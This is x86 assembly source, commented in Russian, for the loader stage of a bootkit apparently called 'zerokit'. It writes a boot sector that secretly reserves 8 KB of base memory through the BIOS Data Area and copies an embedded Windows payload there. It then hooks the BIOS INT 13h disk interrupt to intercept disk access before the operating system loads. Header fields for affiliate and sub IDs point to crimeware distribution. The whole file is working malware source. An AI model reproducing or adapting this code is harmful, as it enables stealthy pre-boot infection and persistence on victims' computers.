org 400h                                                    ; В первых 512 байтах находится наш VBR-сектор (в которомм есть нужные функции).

jmp    l_start
; Копия заголовка zerokit_header_t
zhdr_pack_size dd 0
zhdr_bk_size dd 0
zhdr_bk_payload32_size dd 0
zhdr_bk_payload64_size dd 0
zhdr_conf_size dd 0
zhdr_bundle_size dd 0
zhdr_bundle_affid dd 0
zhdr_bundle_subid dd 0
l_start:
push   cs
pop    ds                                                     ; В ds ложим наш новый сегмент ~ 3000h.
xor    eax, eax
mov    es, ax                                                 ; Обнуляем es и остальные регистры.
mov    si, 0x413                                                                   ; Размер базовой памяти в килобайтах (BIOS Data Area (0040h:0013h))
                                                                                   ; По адресу 0x413 находится слово, в котором содержится количество свободной памяти в пределах первых 640 Кб.
sub    [es:si], word 8                                                             ; Резервируем для себя 8Кб.
es     lodsw                                                                       ; 
shl    ax, 6                                                                       ; * 1024 / 16
mov    es, ax                                                                      ; Сегмент целевого места.
xor    di, di                                                                      ; Смещение целевого места.
mov    si, 2048                                                                    ; Смещение исходного места (смещение где находится windows.asm).
mov    ecx, l_zbk_body_end - l_zbk_body_begin                                      ; Размер копируемых данных в байтах.
rep    movsb                                                                       ; Копируем наш код в выделенное место.

push   word 0
pop    ds

mov    eax, [0x13 * 4]                                                             ; Сохраняем оригинальный обработчик прерывания.
mov    [es:1], eax                                                                 ; сохраняем его в качестве операнда инструкции jmp.
mov    [0x13 * 4], word 6                                                          ; Устанавливаем свой обработчик (смещение до hook_proc_int_13h в windows.asm).
mov    [0x13 * 4 + 2], es

ret

times 510 - ($ - $$) db 0x90

dw 0xAA55

l_zbk_body_begin:
file "..\bin\windows.bin"
l_zbk_body_end: